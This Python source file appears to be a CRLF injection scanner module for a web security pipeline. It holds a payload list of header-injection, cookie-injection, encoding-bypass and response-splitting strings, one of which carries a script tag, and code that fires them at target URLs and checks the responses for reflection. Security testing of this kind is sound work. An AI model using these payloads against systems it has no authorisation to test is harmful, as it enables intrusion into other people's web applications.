"""
CRLF Injection Scanner v1.0

Detects:
1. HTTP header injection via CRLF (%0d%0a)
2. Response splitting
3. Header reflection in response
4. Set-Cookie injection
5. XSS via CRLF (injecting Content-Type or body)
6. Encoding bypasses (double encode, unicode)

Integrates with: main_v3 pipeline
"""

import re
import asyncio
import aiohttp
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from loguru import logger


@dataclass
class CRLFResult:
    url: str
    parameter: str
    vulnerable: bool = False
    crlf_type: str = ""          # header_inject, response_split, cookie_inject
    payload_used: str = ""
    evidence: str = ""           # Injected header found in response
    injected_header: str = ""    # The header that was injected
    confidence: float = 0.0
    severity: str = "high"


# CRLF payloads — inject a custom header "X-CRLF: injected"
CRLF_PAYLOADS = [
    # Standard CRLF
    ("%0d%0aX-CRLF:%20injected", "url_encoded"),
    ("%0d%0aX-CRLF: injected", "url_encoded"),
    # Double URL encoding
    ("%250d%250aX-CRLF:%20injected", "double_encoded"),
    # Unicode
    ("%E5%98%8A%E5%98%8DX-CRLF:%20injected", "unicode"),
    # Literal \r\n
    ("\r\nX-CRLF: injected", "literal"),
    # Mixed
    ("%0d%0a%20X-CRLF:%20injected", "space_prefix"),
    # Set-Cookie injection
    ("%0d%0aSet-Cookie:%20crlftest=1", "cookie_inject"),
    # Content-Type override for XSS
    ("%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>", "response_split"),
    # Null byte + CRLF
    ("%00%0d%0aX-CRLF:%20injected", "null_crlf"),
    # Tab variations
    ("%0d%0a%09X-CRLF:%20injected", "tab"),
]


class CRLFScanner:
    """CRLF Injection detection engine."""

    def __init__(self, config=None):
        self.timeout = 10
        self.max_params = 6

    async def scan(
        self, url: str, session: aiohttp.ClientSession, waf_name: str = None,
    ) -> List[CRLFResult]:
        """Test URL parameters for CRLF injection."""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            # Also test the URL path itself
            path_result = await self._test_path_crlf(url, session)
            if path_result:
                results.append(path_result)
            return results

        logger.info(f"[CRLF] Testing {len(params)} params on {url[:60]}")

        for pname in list(params.keys())[:self.max_params]:
            for payload, ptype in CRLF_PAYLOADS:
                result = await self._test_crlf(url, pname, params, payload, ptype, session)
                if result:
                    results.append(result)
                    break  # Found for this param

        # Also test path injection
        path_result = await self._test_path_crlf(url, session)
        if path_result:
            results.append(path_result)

        if results:
            logger.info(f"[CRLF] Found {len(results)} CRLF issues on {url[:60]}")

        return results

    async def _test_crlf(
        self, url: str, param: str, params: Dict,
        payload: str, ptype: str, session: aiohttp.ClientSession,
    ) -> Optional[CRLFResult]:
        """Test a single CRLF payload on a parameter."""
        try:
            # Inject into parameter value
            test_url = self._inject_param(url, param, params, f"test{payload}")

            async with session.get(test_url, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout),
                                  allow_redirects=False) as resp:
                
                # Check if our header appears in response headers
                crlf_header = resp.headers.get("X-CRLF", "")
                if crlf_header == "injected":
                    return CRLFResult(
                        url=url,
                        parameter=param,
                        vulnerable=True,
                        crlf_type="header_inject",
                        payload_used=payload,
                        evidence=f"Injected header reflected: X-CRLF: {crlf_header}",
                        injected_header="X-CRLF: injected",
                        confidence=0.95,
                        severity="high",
                    )

                # Check Set-Cookie injection
                if "cookie_inject" in ptype:
                    set_cookies = resp.headers.getall("Set-Cookie", [])
                    for sc in set_cookies:
                        if "crlftest=1" in sc:
                            return CRLFResult(
                                url=url,
                                parameter=param,
                                vulnerable=True,
                                crlf_type="cookie_inject",
                                payload_used=payload,
                                evidence=f"Cookie injected: {sc}",
                                injected_header="Set-Cookie: crlftest=1",
                                confidence=0.95,
                                severity="critical",
                            )

                # Check response splitting (script in body via header injection)
                if "response_split" in ptype:
                    body = await resp.text(errors='replace')
                    if "<script>alert(1)</script>" in body:
                        return CRLFResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            crlf_type="response_split",
                            payload_used=payload,
                            evidence="Response splitting: script injected via CRLF",
                            injected_header="Content-Type + body",
                            confidence=0.95,
                            severity="critical",
                        )

                # Check if CRLF characters appear in raw response header values
                # (some servers reflect params in headers like Location, Set-Cookie)
                for header, value in resp.headers.items():
                    if "injected" in value.lower() and "crlf" in value.lower():
                        return CRLFResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            crlf_type="header_inject",
                            payload_used=payload,
                            evidence=f"Header reflected: {header}: {value[:100]}",
                            injected_header=f"{header}: {value[:50]}",
                            confidence=0.85,
                            severity="high",
                        )

        except Exception as e:
            logger.debug(f"[CRLF] Test error: {e}")

        return None

    async def _test_path_crlf(
        self, url: str, session: aiohttp.ClientSession,
    ) -> Optional[CRLFResult]:
        """Test CRLF injection in the URL path."""
        parsed = urlparse(url)
        
        for payload, ptype in CRLF_PAYLOADS[:3]:
            try:
                crlf_path = parsed.path.rstrip('/') + '/' + f"test{payload}"
                test_url = urlunparse((parsed.scheme, parsed.netloc, crlf_path,
                                      '', parsed.query, ''))

                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout),
                                      allow_redirects=False) as resp:

                    crlf_header = resp.headers.get("X-CRLF", "")
                    if crlf_header == "injected":
                        return CRLFResult(
                            url=url,
                            parameter="[path]",
                            vulnerable=True,
                            crlf_type="header_inject",
                            payload_used=f"path/{payload}",
                            evidence=f"Path CRLF injection: X-CRLF: {crlf_header}",
                            injected_header="X-CRLF: injected",
                            confidence=0.95,
                            severity="high",
                        )

            except Exception:
                continue

        return None

    def _inject_param(self, url: str, param: str, params: Dict, value: str) -> str:
        parsed = urlparse(url)
        parts = []
        for k, v in params.items():
            if k == param:
                parts.append(f"{quote(k, safe='')}={value}")  # Don't re-encode CRLF value
            else:
                val = v[0] if isinstance(v, list) else v
                parts.append(f"{quote(k, safe='')}={quote(str(val), safe='')}")
        new_query = '&'.join(parts)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))
